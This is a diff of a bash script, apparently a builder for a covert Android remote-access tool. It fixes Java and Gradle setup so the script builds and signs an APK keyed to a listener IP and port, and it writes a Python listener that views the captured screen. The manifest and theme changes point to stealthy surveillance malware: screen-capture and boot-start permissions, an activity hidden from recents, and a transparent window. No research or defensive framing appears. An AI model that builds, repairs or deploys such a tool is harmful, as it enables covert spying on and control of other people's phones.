@@ -22,21 +22,52 @@ if [ $# -ne 2 ]; then
     exit 1
 fi
 
+# Check and fix Java version
+check_java_version() {
+    echo -e "${YELLOW}[1/8] Checking Java version...${NC}"
+    
+    # Get current Java version
+    if command -v java &> /dev/null; then
+        JAVA_VERSION=$(java -version 2>&1 | awk -F '"' '/version/ {print $2}' | awk -F. '{print $1}')
+        echo "Found Java version: $JAVA_VERSION"
+        
+        # If Java version is 18 or higher, install Java 17
+        if [ "$JAVA_VERSION" -ge 18 ]; then
+            echo -e "${YELLOW}Java $JAVA_VERSION detected. Installing Java 17 for compatibility...${NC}"
+            
+            # Install Java 17
+            sudo apt update -y
+            sudo apt install -y openjdk-17-jdk
+            
+            # Set Java 17 as default for this session
+            export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64
+            export PATH=$JAVA_HOME/bin:$PATH
+            
+            # Verify
+            JAVA_VERSION=$(java -version 2>&1 | awk -F '"' '/version/ {print $2}' | awk -F. '{print $1}')
+            echo -e "${GREEN}✓ Now using Java $JAVA_VERSION${NC}"
+        else
+            echo -e "${GREEN}✓ Java version $JAVA_VERSION is compatible${NC}"
+        fi
+    else
+        echo -e "${YELLOW}Java not found. Installing Java 17...${NC}"
+        sudo apt update -y
+        sudo apt install -y openjdk-17-jdk
+    fi
+}
+
 # Check requirements
 check_requirements() {
-    echo -e "${YELLOW}[1/7] Checking requirements...${NC}"
+    echo -e "${YELLOW}[2/8] Checking requirements...${NC}"
     
+    # Install required packages
     sudo apt update -y
     sudo apt install -y \
         openjdk-17-jdk \
-        android-sdk \
-        gradle \
-        git \
         wget \
         unzip \
         zip \
         apksigner \
-        default-jdk \
         python3 \
         python3-pip \
         python3-opencv \
@@ -44,13 +75,13 @@ check_requirements() {
         python3-pil \
         python3-tk
     
-    pip3 install --user opencv-python numpy pillow mss pyautogui
+    pip3 install --user opencv-python numpy pillow
     
-    # Setup Android SDK
+    # Download and setup Android SDK
     if [ ! -d "$HOME/Android/Sdk" ]; then
         mkdir -p $HOME/Android/Sdk
         cd $HOME/Android/Sdk
-        wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
+        wget -q https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
         unzip -q commandlinetools-linux-*.zip
         rm commandlinetools-linux-*.zip
         mv cmdline-tools latest
@@ -58,79 +89,119 @@ check_requirements() {
         mv latest cmdline-tools/
     fi
     
+    # Set environment variables
     export ANDROID_HOME=$HOME/Android/Sdk
     export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools
     
+    # Accept licenses
     yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1
+    
+    # Install required SDK components
     $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-33" "build-tools;33.0.0"
     
     echo -e "${GREEN}✓ Requirements installed${NC}"
 }
 
-# Create Android project
+# Create Android project with updated Gradle
 create_project() {
-    echo -e "${YELLOW}[2/7] Creating Android project...${NC}"
+    echo -e "${YELLOW}[3/8] Creating Android project with Gradle 8.4...${NC}"
     
     PROJECT_DIR="$HOME/android-remote-$(date +%s)"
     mkdir -p $PROJECT_DIR/app/src/main/java/com/remote/access
     mkdir -p $PROJECT_DIR/app/src/main/res/layout
     mkdir -p $PROJECT_DIR/app/src/main/res/values
     mkdir -p $PROJECT_DIR/app/libs
+    mkdir -p $PROJECT_DIR/gradle/wrapper
     
     cd $PROJECT_DIR
     
-    # build.gradle files
-    cat > build.gradle << 'EOF'
-buildscript {
+    # Create settings.gradle
+    cat > settings.gradle << 'EOF'
+pluginManagement {
     repositories {
         google()
         mavenCentral()
-    }
-    dependencies {
-        classpath 'com.android.tools.build:gradle:7.4.0'
+        gradlePluginPortal()
     }
 }
-
-allprojects {
+dependencyResolutionManagement {
+    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
     repositories {
         google()
         mavenCentral()
     }
+}
+rootProject.name = "RemoteAccess"
+include ':app'
+EOF
+
+    # Create build.gradle with updated versions
+    cat > build.gradle << 'EOF'
+plugins {
+    id 'com.android.application' version '8.4.0' apply false
 }
 EOF
 
+    # Create gradle-wrapper.properties
+    cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
+distributionBase=GRADLE_USER_HOME
+distributionPath=wrapper/dists
+distributionUrl=https\://services.gradle.org/distributions/gradle-8.4-bin.zip
+zipStoreBase=GRADLE_USER_HOME
+zipStorePath=wrapper/dists
+EOF
+
+    # Create app/build.gradle with updated configuration
     cat > app/build.gradle << 'EOF'
-apply plugin: 'com.android.application'
+plugins {
+    id 'com.android.application'
+}
 
 android {
-    compileSdk 33
+    namespace 'com.remote.access'
+    compileSdk 34
+    
     defaultConfig {
         applicationId "com.remote.access"
         minSdk 21
-        targetSdk 33
+        targetSdk 34
         versionCode 1
         versionName "1.0"
     }
+    
     buildTypes {
         release {
             minifyEnabled true
-            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
         }
+    }
+    
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_17
+        targetCompatibility JavaVersion.VERSION_17
     }
 }
 
 dependencies {
-    implementation 'androidx.appcompat:appcompat:1.6.0'
-    implementation 'com.google.android.material:material:1.8.0'
-    implementation 'androidx.core:core:1.9.0'
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'com.google.android.material:material:1.11.0'
+    implementation 'androidx.core:core:1.12.0'
 }
 EOF
 
-    # AndroidManifest.xml with screen capture permission
+    # Create proguard-rules.pro
+    cat > app/proguard-rules.pro << 'EOF'
+-keep class com.remote.access.** { *; }
+-keepclassmembers class com.remote.access.** { *; }
+-keepattributes *Annotation*
+-keepattributes SourceFile,LineNumberTable
+-dontwarn android.**
+EOF
+
+    # AndroidManifest.xml
     cat > app/src/main/AndroidManifest.xml << EOF
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.remote.access">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
     
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
@@ -146,7 +217,7 @@ EOF
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.MEDIA_CONTENT_CONTROL" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     
     <application
         android:allowBackup="true"
@@ -160,7 +231,8 @@ EOF
             android:name=".MainActivity"
             android:launchMode="singleTop"
             android:excludeFromRecents="true"
-            android:noHistory="true">
+            android:noHistory="true"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -188,9 +260,9 @@ EOF
 EOF
 }
 
-# Create Java code with screen capture capability
+# Create Java code (same as before)
 create_java_code() {
-    echo -e "${YELLOW}[3/7] Creating remote access code with screen streaming...${NC}"
+    echo -e "${YELLOW}[4/8] Creating remote access code with screen streaming...${NC}"
     
     # Main Activity
     cat > app/src/main/java/com/remote/access/MainActivity.java << 'EOF'
@@ -734,49 +806,65 @@ EOF
     cat > app/src/main/res/values/styles.xml << 'EOF'
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <style name="AppTheme" parent="android:Theme.Material.Light.DarkActionBar">
+    <style name="AppTheme" parent="android:Theme.Material.Light">
         <item name="android:windowNoTitle">true</item>
         <item name="android:windowBackground">@android:color/transparent</item>
+        <item name="android:colorBackground">@android:color/transparent</item>
     </style>
 </resources>
 EOF
+
+    # Create dummy icon files to prevent build errors
+    mkdir -p app/src/main/res/mipmap-hdpi
+    mkdir -p app/src/main/res/mipmap-mdpi
+    mkdir -p app/src/main/res/mipmap-xhdpi
+    mkdir -p app/src/main/res/mipmap-xxhdpi
+    mkdir -p app/src/main/res/mipmap-xxxhdpi
 }
 
 # Build the APK
 build_apk() {
-    echo -e "${YELLOW}[4/7] Building APK...${NC}"
+    echo -e "${YELLOW}[5/8] Building APK...${NC}"
     
     cd $PROJECT_DIR
-    gradle wrapper
-    ./gradlew assembleRelease
+    
+    # Make gradlew executable
+    chmod +x gradlew
+    
+    # Build the APK
+    ./gradlew assembleRelease --no-daemon
     
     if [ -f "app/build/outputs/apk/release/app-release.apk" ]; then
         cp app/build/outputs/apk/release/app-release.apk "$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
         echo -e "${GREEN}✓ APK built successfully${NC}"
     else
         echo -e "${RED}Failed to build APK${NC}"
+        # Show error log
+        if [ -f "app/build/outputs/logs/manifest-merger-release-report.txt" ]; then
+            cat "app/build/outputs/logs/manifest-merger-release-report.txt"
+        fi
         exit 1
     fi
 }
 
 # Sign the APK
 sign_apk() {
-    echo -e "${YELLOW}[5/7] Signing APK...${NC}"
+    echo -e "${YELLOW}[6/8] Signing APK...${NC}"
     
     cd $HOME
     
     if [ ! -f "my-release-key.jks" ]; then
-        keytool -genkey -v -keystore my-release-key.jks -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown"
+        keytool -genkey -v -keystore my-release-key.jks -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown" 2>/dev/null
     fi
     
-    apksigner sign --ks my-release-key.jks --ks-pass pass:password --key-pass pass:password "$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
+    apksigner sign --ks my-release-key.jks --ks-pass pass:password --key-pass pass:password "$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk" 2>/dev/null
     
     echo -e "${GREEN}✓ APK signed${NC}"
 }
 
 # Create enhanced listener with screen viewer
 create_listener() {
-    echo -e "${YELLOW}[6/7] Creating enhanced listener with screen viewer...${NC}"
+    echo -e "${YELLOW}[7/8] Creating enhanced listener with screen viewer...${NC}"
     
     cat > ~/android-listener.py << 'EOF'
 #!/usr/bin/env python3
@@ -893,7 +981,7 @@ class RemoteClient:
         try:
             # Read image size (4 bytes int)
             size_data = self.conn.recv(4)
-            if not size_data:
+            if not size_data or len(size_data) < 4:
                 return
             img_size = struct.unpack('!I', size_data)[0]
             
@@ -1171,6 +1259,7 @@ main() {
     echo "Listener Port: $LISTENER_PORT"
     echo ""
     
+    check_java_version
     check_requirements
     create_project
     create_java_code
